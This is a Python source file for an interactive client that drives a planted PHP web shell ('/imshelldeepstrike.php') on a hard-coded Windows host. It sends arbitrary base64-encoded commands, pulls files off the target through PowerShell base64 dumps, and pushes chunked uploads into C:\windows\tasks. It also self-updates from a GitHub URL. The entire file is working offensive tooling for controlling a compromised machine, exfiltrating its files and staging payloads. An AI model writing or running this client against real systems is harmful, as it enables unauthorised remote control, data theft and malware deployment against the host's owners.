import base64
import hashlib
import os
import sys
from datetime import datetime
from pathlib import Path
from typing import Optional, Tuple

import requests

try:
    import readline  # type: ignore[import]
except Exception:
    readline = None  # type: ignore[assignment]

SCHEME = "http"
HOST = "10.143.4.133"
PATH = "/imshelldeepstrike.php"
TIMEOUT = None
SEPARATOR = "=" * 60
SUB_SEPARATOR = "-" * 60

# Default chunk size for uploads; can be overridden with the
# CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable. We clamp the size
# to avoid generating PowerShell/HTTP commands that are too large.
_DEFAULT_CHUNK = 16384  # 16 KiB
_MIN_CHUNK = 1024  # 1 KiB
_MAX_CHUNK = 65536  # 64 KiB


def _compute_upload_chunk_size() -> int:
    raw = os.getenv("CMD_CLIENT_UPLOAD_CHUNK_SIZE")
    if raw is None:
        return _DEFAULT_CHUNK
    try:
        value = int(raw)
    except ValueError:
        return _DEFAULT_CHUNK
    return max(_MIN_CHUNK, min(_MAX_CHUNK, value))


UPLOAD_CHUNK_SIZE = _compute_upload_chunk_size()
# Default directory on the remote Windows host when no remote path
# is provided explicitly for uploads.
DEFAULT_REMOTE_UPLOAD_DIR = r"C:\windows\tasks"
UPDATE_URL = (
    "https://raw.githubusercontent.com/Hunt3r0x/shared/refs/heads/main/cmd_client.py"
)
# Log file for commands and their responses.
LOG_PATH = Path(__file__).with_name("cmd-client.log")


def build_url() -> str:
    return f"{SCHEME}://{HOST}{PATH}"


def encode_cmd(cmd: str) -> str:
    data = cmd.encode("utf-8", errors="ignore")
    return base64.b64encode(data).decode("ascii")


def send_command(cmd: str) -> Tuple[str, Optional[int]]:
    encoded = encode_cmd(cmd)
    url = build_url()
    try:
        if TIMEOUT is None:
            res = requests.post(url, data={"c": encoded})
        else:
            res = requests.post(url, data={"c": encoded}, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return "request timed out", None
    except requests.exceptions.ConnectionError:
        return "connection failed", None
    except requests.RequestException as exc:
        return f"request error: {exc}", None
    body = res.text.strip()
    if not res.ok:
        prefix = f"http {res.status_code}"
        if body:
            return f"{prefix}: {body}", res.status_code
        return prefix, res.status_code
    return body, res.status_code


def send_upload(
    file_data: bytes, remote_path: str, chunk_index: Optional[int] = None
) -> Tuple[str, Optional[int]]:
    """
    Upload a file (or chunk) directly via POST with r (base64 data) and n (full remote path) parameters.
    This uses the /imshelldeepstrike.php upload endpoint which saves to the provided remote_path.
    
    Args:
        file_data: The file data (or chunk) to upload
        remote_path: Full remote path where the file should be saved
        chunk_index: Optional chunk index (0-based). If None, single upload is assumed.
    """
    b64_data = base64.b64encode(file_data).decode("ascii")
    url = build_url()
    post_data = {"r": b64_data, "n": remote_path}
    if chunk_index is not None:
        post_data["chunk"] = str(chunk_index)
    
    try:
        if TIMEOUT is None:
            res = requests.post(url, data=post_data)
        else:
            res = requests.post(url, data=post_data, timeout=TIMEOUT)
    except requests.exceptions.Timeout:
        return "request timed out", None
    except requests.exceptions.ConnectionError:
        return "connection failed", None
    except requests.RequestException as exc:
        return f"request error: {exc}", None
    body = res.text.strip()
    if not res.ok:
        prefix = f"http {res.status_code}"
        if body:
            return f"{prefix}: {body}", res.status_code
        return prefix, res.status_code
    return body, res.status_code


def extract_pre(text: str) -> str:
    """
    Extract content inside the <pre>...</pre> that shell.php wraps around output.
    Falls back to returning the whole body if tags are not found.
    """
    lower = text.lower()
    start = lower.find("<pre>")
    end = lower.rfind("</pre>")
    if start == -1 or end == -1 or end <= start:
        return text
    return text[start + len("<pre>") : end].strip()


def ps_escape_single_quotes(value: str) -> str:
    """
    Escape single quotes for use inside a single-quoted PowerShell string literal.
    In PowerShell, single quotes are escaped by doubling them: ' -> ''.
    """
    return value.replace("'", "''")


def download_file(remote_path: str, local_path: str) -> int:
    """
    Download a remote file from a **Windows** target by having PowerShell
    base64-encode it, then decoding and writing it locally.
    """
    # Build a PowerShell command that prints base64 of the file to stdout
    remote_ps = ps_escape_single_quotes(remote_path)
    cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"[Convert]::ToBase64String([IO.File]::ReadAllBytes('{remote_ps}'))\""
    )
    body, status = send_command(cmd)
    if status is not None and status != 200:
        raise RuntimeError(f"download failed, status={status}: {body}")

    inner = extract_pre(body)
    inner = inner.strip()
    if not inner:
        raise RuntimeError("download failed: empty response/body")

    try:
        data = base64.b64decode(inner, validate=False)
    except Exception as exc:
        raise RuntimeError(f"download failed: invalid base64 data ({exc})") from exc

    path = Path(local_path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)
    return len(data)


def upload_file(local_path: str, remote_path: str) -> dict:
    """
    Upload a local file to a **Windows** target using the direct POST upload
    method (r/n parameters) via /imshelldeepstrike.php.
    The file is saved to the full remote_path provided by the user.
    Large files are automatically chunked to avoid PHP POST size limits.
    """
    path = Path(local_path)
    if not path.is_file():
        raise FileNotFoundError(f"local file not found: {local_path}")

    data = path.read_bytes()
    total = len(data)

    if total == 0:
        raise ValueError("cannot upload empty file")

    # Determine if we need chunking
    use_chunking = total > UPLOAD_CHUNK_SIZE
    num_chunks = (total + UPLOAD_CHUNK_SIZE - 1) // UPLOAD_CHUNK_SIZE if use_chunking else 1

    if use_chunking:
        print(
            f"[upload] starting '{local_path}' -> '{remote_path}' "
            f"({total} bytes, using chunked upload: {num_chunks} chunks of ~{UPLOAD_CHUNK_SIZE} bytes)"
        )
    else:
        print(
            f"[upload] starting '{local_path}' -> '{remote_path}' "
            f"({total} bytes)"
        )

    last_body: str = ""
    last_status: Optional[int] = None

    if use_chunking:
        # Chunked upload
        offset = 0
        chunk_index = 0
        
        while offset < total:
            chunk = data[offset : offset + UPLOAD_CHUNK_SIZE]
            offset += len(chunk)
            
            upload_body, upload_status = send_upload(chunk, remote_path, chunk_index)
            
            if upload_status is not None and upload_status != 200:
                snippet = upload_body[:200] if upload_body else ""
                raise RuntimeError(
                    f"upload chunk {chunk_index}/{num_chunks} failed "
                    f"with status={upload_status}: {snippet!r}"
                )
            
            # Check PHP response for errors
            if upload_body and upload_body.startswith("ERROR:"):
                raise RuntimeError(
                    f"upload chunk {chunk_index}/{num_chunks} failed: {upload_body}"
                )
            
            chunk_index += 1
            progress_pct = int((offset / total) * 100) if total > 0 else 0
            print(
                f"[upload] chunk {chunk_index}/{num_chunks} ({len(chunk)} bytes) "
                f"- {progress_pct}% complete"
            )
            
            last_body = upload_body
            last_status = upload_status
    else:
        # Single upload for small files
        upload_body, upload_status = send_upload(data, remote_path)
        
        if upload_status is not None and upload_status != 200:
            snippet = upload_body[:200] if upload_body else ""
            raise RuntimeError(
                f"upload failed with status={upload_status}: {snippet!r}"
            )
        
        # Check PHP response for errors
        if upload_body and upload_body.startswith("ERROR:"):
            raise RuntimeError(f"upload failed: {upload_body}")
        
        print(f"[upload] sent file ({total} bytes)")
        last_body = upload_body
        last_status = upload_status

    # Verify remote size
    remote_ps = ps_escape_single_quotes(remote_path)
    size_cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"if (Test-Path '{remote_ps}') "
        "{{(Get-Item '{remote_ps}').Length}} else {{'NO_SUCH_FILE'}}\""
    )
    size_body, size_status = send_command(size_cmd)
    size_text = extract_pre(size_body).strip()

    # Compute local hash and ask the remote to compute the same hash.
    local_hash = hashlib.sha256(data).hexdigest()
    hash_cmd = (
        "powershell -NoLogo -NonInteractive -Command "
        f"\"if (Test-Path '{remote_ps}') "
        "{{(Get-FileHash -Algorithm SHA256 '{remote_ps}').Hash}} "
        "else {{'NO_SUCH_FILE'}}\""
    )
    hash_body, hash_status = send_command(hash_cmd)
    remote_hash_text = extract_pre(hash_body).strip()

    return {
        "total": total,
        "chunks": num_chunks,
        "last_body": last_body,
        "last_status": last_status,
        "remote_size_text": size_text,
        "remote_size_status": size_status,
        "remote_path": remote_path,
        "local_hash": local_hash,
        "remote_hash_text": remote_hash_text,
        "remote_hash_status": hash_status,
    }


def print_response(cmd: str, body: str, status: Optional[int]) -> None:
    """
    Print a nicely formatted response to stdout and append it to the log file.
    """
    block_lines = []
    block_lines.append(SEPARATOR)
    block_lines.append(f"cmd: {cmd}")
    if status is not None:
        block_lines.append(f"status: {status}")
    block_lines.append(SUB_SEPARATOR)

    text = body.strip()
    if not text:
        block_lines.append("[no output]")
    else:
        raw_lines = [line.rstrip() for line in text.splitlines()]
        blank = False
        for line in raw_lines:
            if line:
                if blank:
                    blank = False
                block_lines.append(line)
            else:
                if not blank:
                    block_lines.append("")
                    blank = True
    block_lines.append(SEPARATOR)

    # Print to console
    for line in block_lines:
        print(line)

    # Append to log file with a timestamp header
    try:
        LOG_PATH.parent.mkdir(parents=True, exist_ok=True)
        with LOG_PATH.open("a", encoding="utf-8") as fh:
            fh.write(f"time: {datetime.utcnow().isoformat()}Z\n")
            for line in block_lines:
                fh.write(line + "\n")
            fh.write("\n")
    except OSError:
        # Logging failures should not break the client.
        pass


def read_cmd() -> Optional[str]:
    """
    Read a single command from the user.

    Behaviour:
    - EOF (Ctrl+D / Ctrl+Z+Enter on Windows) => return None (caller exits)
    - Empty line => return "" (caller just reprompts)
    - "exit"/"quit" => return None (caller exits)
    - Ctrl+C while typing => return "" (cancel current input, new prompt)
    """
    try:
        value = input("cmd> ")
    except EOFError:
        # Graceful end-of-input: tell caller to exit.
        return None
    except KeyboardInterrupt:
        # Cancel the current line, show a fresh prompt.
        print()
        return ""

    value = value.strip()
    if not value:
        return ""
    if value.lower() in ("exit", "quit"):
        return None

    # Maintain a unique readline history: each command appears at most once,
    # positioned according to its most recent use.
    if readline is not None:
        try:
            try:
                length = readline.get_current_history_length()
            except AttributeError:
                length = 0

            # Remove any existing occurrences of this command from history
            # (iterate backwards so indices stay valid).
            if length > 0:
                for idx in range(length, 0, -1):
                    item = readline.get_history_item(idx)
                    if item == value:
                        try:
                            readline.remove_history_item(idx - 1)
                        except Exception:
                            # Some readline implementations may not support removal;
                            # in that case we just fall back to normal add_history.
                            break

            readline.add_history(value)
        except Exception:
            # If anything goes wrong with readline, we just skip history handling.
            pass

    return value


def perform_update() -> None:
    """
    Fetch the latest cmd_client.py from GitHub, overwrite the local file,
    and restart this script so the new version is used immediately.
    """
    print(f"[update] fetching latest client from:\n         {UPDATE_URL}")
    try:
        res = requests.get(UPDATE_URL, timeout=15)
    except requests.RequestException as exc:
        print(f"[update error] request failed: {exc}")
        return

    if not res.ok:
        print(f"[update error] http {res.status_code}: {res.text.strip()}")
        return

    new_source = res.text
    target = Path(__file__).resolve()

    try:
        target.write_text(new_source, encoding="utf-8")
    except OSError as exc:
        print(f"[update error] failed to write file: {exc}")
        return

    print(f"[update] updated {target.name} ({len(new_source.encode('utf-8'))} bytes)")
    print("[update] restarting client with new version...")
    # Replace the current process with a fresh Python running THIS file
    # explicitly, so any previously imported module state is discarded.
    sys.stdout.flush()
    os.execv(sys.executable, [sys.executable, str(target)] + sys.argv[1:])


def print_help() -> None:
    """
    Show available local/meta commands and basic usage.
    """
    print(SEPARATOR)
    print("Local/meta commands:")
    print(SUB_SEPARATOR)
    print("  :download <remote_path> <local_path>")
    print("      Download a file from the remote host to this machine.")
    print()
    print("  :upload <local_path> [remote_path]")
    print(
        f"      Upload a local file to the remote host. If remote_path is omitted,"
    )
    print(
        f"      the file is stored as {DEFAULT_REMOTE_UPLOAD_DIR}\\<filename> on the remote."
    )
    print("      Uploads are chunked; you can tune the chunk size using")
    print("      the CMD_CLIENT_UPLOAD_CHUNK_SIZE environment variable.")
    print("      Very large files may still be better transferred via an")
    print("      HTTP server and DownloadFile() from the remote.")
    print()
    print("  :update")
    print("      Pull the latest client from GitHub and restart.")
    print("      Warning: this overwrites local edits with the GitHub version.")
    print()
    print("  :help")
    print("      Show this help message.")
    print()
    print("General:")
    print("  - Any other input is sent as a command to the remote shell.")
    print("  - Use 'exit' or 'quit', or send EOF to exit the client.")
    print(SEPARATOR)


def main() -> None:
    print("Type commands to send to the remote shell.")
    print("Use 'exit' or 'quit', or send EOF to exit.")
    print("Type ':help' for a list of local commands.")
    while True:
        cmd = read_cmd()
        if cmd is None:
            print("Exiting client.")
            break
        if cmd == "":
            # Blank/aborted input: just reprompt
            continue

        # Local meta-commands
        if cmd.strip() == ":help":
            print_help()
            continue

        if cmd.startswith(":download "):
            parts = cmd.split(maxsplit=2)
            if len(parts) != 3:
                print("usage: :download <remote_path> <local_path>")
                continue
            _, remote_path, local_path = parts
            try:
                size = download_file(remote_path, local_path)
                msg = (
                    f"[download] saved remote '{remote_path}' to "
                    f"'{local_path}' ({size} bytes)"
                )
                print_response(cmd, msg, None)
            except Exception as exc:
                err = f"[download error] {exc}"
                print(err)
                print_response(cmd, err, None)
            continue

        if cmd.startswith(":upload"):
            # Accept both:
            #   :upload <local>
            #   :upload <local> <remote>
            rest = cmd[len(":upload") :].strip()
            if not rest:
                print("usage: :upload <local_path> [remote_path]")
                continue

            parts = rest.split(maxsplit=1)
            local_path = parts[0]
            if len(parts) == 1:
                # Only local path supplied. Upload to default remote directory
                # with the same base name as the local file.
                remote_path = str(
                    Path(DEFAULT_REMOTE_UPLOAD_DIR) / Path(local_path).name
                )
            else:
                remote_path = parts[1]
            try:
                result = upload_file(local_path, remote_path)
                summary_lines = [
                    f"[upload] finished '{local_path}' "
                    f"({result['total']} bytes) "
                    f"to remote '{result['remote_path']}' "
                    f"in {result['chunks']} chunks",
                    f"[upload] reported remote size text: "
                    f"{result['remote_size_text']!r} "
                    f"(status={result['remote_size_status']})",
                ]

                # Hash comparison summary
                remote_hash = result["remote_hash_text"]
                hash_status = result["remote_hash_status"]
                local_hash = result["local_hash"]
                if remote_hash and remote_hash != "NO_SUCH_FILE":
                    if remote_hash.lower() == local_hash.lower():
                        hash_summary = (
                            "[upload] hash OK: remote SHA256 matches local"
                        )
                    else:
                        hash_summary = (
                            "[upload] hash MISMATCH: "
                            f"local={local_hash} remote={remote_hash}"
                        )
                else:
                    hash_summary = (
                        "[upload] hash verification unavailable or remote file "
                        "missing"
                    )

                summary_lines.append(hash_summary)
                summary_body = "\n".join(summary_lines)
                print_response(
                    f"[upload {local_path} -> {remote_path}]",
                    summary_body,
                    None,
                )
            except Exception as exc:
                err = f"[upload error] {exc}"
                print(err)
                print_response(
                    f"[upload {local_path} -> {remote_path}]",
                    err,
                    None,
                )
            continue

        if cmd.strip() == ":update":
            try:
                perform_update()
            except Exception as exc:
                print(f"[update error] {exc}")
            # If perform_update succeeds, os.execv will replace this process
            # and we will never reach this point.
            continue

        try:
            body, status = send_command(cmd)
        except KeyboardInterrupt:
            # Allow Ctrl+C during a running request to abort the command
            # but keep the client running.
            print("\n[interrupted, command cancelled]")
            continue
        print_response(cmd, body, status)


if __name__ == "__main__":
    main()

